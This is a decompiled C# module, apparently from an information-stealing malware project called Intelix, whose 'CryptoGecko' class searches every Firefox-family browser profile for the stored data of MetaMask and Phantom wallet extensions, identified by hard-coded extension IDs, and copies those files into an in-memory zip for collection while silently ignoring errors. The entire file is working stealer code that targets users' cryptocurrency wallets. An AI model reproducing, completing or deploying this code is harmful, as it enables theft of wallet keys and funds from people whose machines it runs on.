using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Browsers
{
	// Token: 0x02000039 RID: 57
	public class CryptoGecko : ITarget
	{
		// Token: 0x060000BF RID: 191 RVA: 0x0000B4CC File Offset: 0x000096CC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Gecko, delegate(string browser)
			{
				bool flag = Directory.Exists(browser);
				if (flag)
				{
					Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
					{
						string browsername = Paths.GetBrowserName(browser);
						string profilename = Path.GetFileName(profile);
						Task.Run(delegate()
						{
							this.GetGeckoWallets(zip, counter, profile, profilename, browsername);
						});
					});
				}
			});
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x0000B50C File Offset: 0x0000970C
		private void GetGeckoWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
		{
			string extensionsPath = Path.Combine(profilePath, "storage", "default");
			bool flag = !Directory.Exists(extensionsPath);
			if (!flag)
			{
				Parallel.ForEach<string[]>(this.GeckoWalletsDirectories, delegate(string[] walletInfo)
				{
					string str = walletInfo[1];
					string[] directories = Directory.GetDirectories(extensionsPath, "moz-extension+++" + str + "*", SearchOption.TopDirectoryOnly);
					foreach (string text in directories)
					{
						try
						{
							string text2 = string.Concat(new string[]
							{
								browserName,
								"_",
								profilename,
								" ",
								walletInfo[0]
							});
							zip.AddDirectoryFiles(text, text2, true);
							counter.CryptoChromium.Add(text + " => " + text2);
						}
						catch
						{
						}
					}
				});
			}
		}

		// Token: 0x04000014 RID: 20
		private readonly List<string[]> GeckoWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Metamask Wallet",
				"7d61b592-e488-4f55-bf12-8d0ae55fd100"
			},
			new string[]
			{
				"Metamask Wallet",
				"bb29e575-946e-4e69-b956-f73aec0a9927"
			},
			new string[]
			{
				"Phantom Wallet",
				"e212a176-a331-462c-a024-d2f9027f15fc"
			},
			new string[]
			{
				"Phantom Wallet",
				"a02b2aab-5dca-4649-93cf-f6a34860fbd5"
			}
		};
	}
}
